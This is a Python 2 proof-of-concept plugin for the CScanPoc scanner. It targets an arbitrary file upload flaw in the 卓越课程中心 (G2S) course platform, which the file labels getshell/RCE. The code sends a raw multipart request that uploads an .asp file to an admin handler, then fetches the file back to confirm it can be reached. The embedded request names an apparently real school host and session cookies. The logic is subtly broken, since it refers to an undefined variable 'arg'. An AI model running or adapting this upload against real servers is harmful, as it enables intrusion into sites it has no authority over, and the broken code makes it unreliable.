# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'able_G2S_0001' # 平台漏洞编号，留空
    name = '卓越课程中心 getshell任意代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-03-02'  # 漏洞公布时间
    desc = '''
        卓越课程中心 /G2S/AdminSpace/PublicClass/AddVideoCourseWare.ashx?action=UploadImage 可上传任意文件，getshell，影响众多学校。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '卓越课程中心'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '1682e7c8-9f66-4319-b3fc-66f9f5389877'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #ref http://wooyun.org/bugs/wooyun-2010-099059
            hh = hackhttp.hackhttp()
            raw = """
POST AdminSpace/PublicClass/AddVideoCourseWare.ashx?action=UploadImage HTTP/1.1
Host: kczx.sus.edu.cn
Content-Length: 563
Origin: http://kczx.sus.edu.cn
X-Requested-With: ShockwaveFlash/17.0.0.188
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/43.0.2357.130 Chrome/43.0.2357.130 Safari/537.36
Content-Type: multipart/form-data; boundary=----------cH2ae0ae0GI3Ef1cH2ei4cH2ae0gL6
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: ASP.NET_SessionId=a50pid55regfww55fticke45; ASPSESSIONIDCSQCRDCB=OJIBGEKDDNFGACCBKDCCJKDH

------------cH2ae0ae0GI3Ef1cH2ei4cH2ae0gL6
Content-Disposition: form-data; name="Filename"

asp.asp
------------cH2ae0ae0GI3Ef1cH2ei4cH2ae0gL6
Content-Disposition: form-data; name="folder"

/G2S/AdminSpace/PublicClass/
------------cH2ae0ae0GI3Ef1cH2ei4cH2ae0gL6
Content-Disposition: form-data; name="Filedata"; filename="asp.asp"
Content-Type: application/octet-stream

zddfggsfagsdfhdfjskjhsdfkfk
------------cH2ae0ae0GI3Ef1cH2ei4cH2ae0gL6
Content-Disposition: form-data; name="Upload"

Submit Query
------------cH2ae0ae0GI3Ef1cH2ei4cH2ae0gL6--
            """
            url = self.target + '/G2S/AdminSpace/PublicClass/AddVideoCourseWare.ashx?action=UploadImage'
            code, head, res, errcode, _ = hh.http(url, raw=raw)
            if '.asp' not in res or '<' in res:
                return
            url = arg + '/download/' + res
            code, head,res, errcode, _ = hh.http(url)
            if code == 200 and 'zddfggsfagsdfhdfjskjhsdfkfk' in res:
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
